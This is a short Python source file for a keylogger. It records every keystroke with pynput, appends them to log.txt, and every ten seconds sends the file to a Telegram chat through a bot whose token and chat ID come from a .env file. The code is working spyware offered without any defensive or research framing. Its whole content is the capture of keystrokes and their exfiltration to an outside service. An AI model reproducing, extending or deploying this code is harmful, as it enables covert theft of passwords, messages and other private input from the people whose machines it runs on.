from pynput.keyboard import Listener
import threading
from email.message import EmailMessage
from datetime import datetime
import os
import telepot
from dotenv import load_dotenv
load_dotenv('.env')

class KeyLogger():
    def __init__ (self):
        self.token = os.getenv('TOKEN')
        self.bot = telepot.Bot(token=self.token)
        self.id = os.getenv('ID')

    def write_to_file(self, key):
        letter = str(key)
        letter = letter.replace("'", "")

        # para mejorar la lectura del documento de texto
        if letter == 'Key.space':
            letter = ' '
        if letter == 'Key.shift_r':
            letter = ''
        if letter == "Key.ctrl_l":
            letter = ""
        if letter == "Key.enter":
            letter = "\n"
        
        if letter == "Key.esc": 
            pass
        if letter == "\\x18": 
            pass 
        if letter == "\\x03": 
            pass
        if letter == "\\x16":
            pass 

        with open("log.txt", 'a') as f:
            f.write(letter)

    # Collecting events until stopped

    def report(self):
        try:    
            with open("log.txt","r") as file:
                self.send(file)
        except:
            pass

        timer = threading.Timer(10,self.report)
        timer.start()

    def send(self,file):
        try:
            self.bot.sendDocument(self.id, file)
        except Exception:
            print("couldn't send the log")
    
    def start(self):
        with Listener(on_press=self.write_to_file) as l:
            self.report()
            l.join()
